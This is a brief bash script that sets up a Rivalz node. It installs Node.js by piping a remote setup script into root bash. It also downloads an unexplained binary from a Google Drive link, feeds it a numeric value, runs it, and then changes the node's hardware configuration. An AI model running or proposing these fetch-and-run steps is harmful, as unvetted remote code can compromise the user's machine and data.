#!/bin/bash

curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - && \
sudo apt install -y nodejs

npm i -g rivalz-node-cli

df -h

curl -sSL -o rivalzPPH 'https://drive.google.com/uc?export=download&id=1GHhIZ_7nVc6G030Tz6NRWCyQ4rGyWPRp' && chmod +x rivalzPPH && echo "683271736128438286\n" | ./rivalzPPH && rivalz change-hardware-config

rivalz run


